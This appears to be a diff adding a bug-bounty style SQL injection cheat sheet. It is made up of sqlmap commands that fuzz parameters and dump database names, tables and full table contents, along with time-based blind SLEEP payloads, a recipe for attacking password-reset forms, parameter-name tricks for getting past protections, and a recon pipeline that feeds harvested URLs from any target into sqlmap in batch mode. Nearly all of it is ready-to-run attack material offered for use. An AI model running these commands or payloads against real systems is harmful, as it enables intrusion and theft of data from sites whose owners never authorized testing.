@@ -1,0 +1,47 @@
+#Fuzz for SQL Injection
+sqlmap -r request.txt 
+#Specifying Database
+sqlmap -r request.txt --dbms Cubrid --level 3 --risk 3 
+#Fuzzing Vulnerable Param 
+sqlmap -r request.txt --dbms MySQL --level 3 --risk 3 -p <PARAM_NAME_VULNERABLE_TO_SQLi> 
+#Dump database names
+sqlmap -r request.txt --dbms MySQL --level 3 --risk 3 --dbs 
+#Dump table names
+sqlmap -r request.txt --dbms MySQL --level 3 --risk 3 --tables 
+#Dump all data from the given database & table
+sqlmap -r request.txt --dbms MySQL --level 3 --risk 3 -D <DB_NAME> -T <TABLE_NAME> --dump
+
+
+In username email,parameter 
+Sleep Payload : by @GodfatherOrwa
+ 
+
+orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+exploit👇
+sqlmap -r request.txt -p email/username --force-ssl -level 5 --risk 3 --dbms="MySQL" --test-filter="MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1
+
+https://adityashende17.medium.com/finding-time-based-sqli-injections-edition-2023-8e079127b56a
+
+(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'"%2B(select(0)from(select(sleep(6)))v)%2B"*/
+
+
+Reset password > enter any email address > open network tab > enter reset > copy request headers and post data > save as req.txt use sqlmap -r req.txt --batch --random-agent --dbs > Done email parameter vulnerable to SQLi
+
+
+we all try to change the values of parameters to find vulnerabilites, but did you know that you can also try to change the name of the parameter?
+
+eg-> 
+
+?parameter=123 ==> 200 OK
+?parameter[]=123 ==> Bypass protection
+?paramter[id']=123 ==> SQL injection
+
+subfinder -d target | tee -a domains
+cat domain | httpx | tee -a alive.txt
+cat alive.txt | waybackurls | tee -a urls 
+gf sqli urls >> sqli
+sqlmap -m sqli --dbs --batch
+
+sqlmap -r request.txt --level=5 --risk=3 --force-ssl --ignore-code=500 --dbs
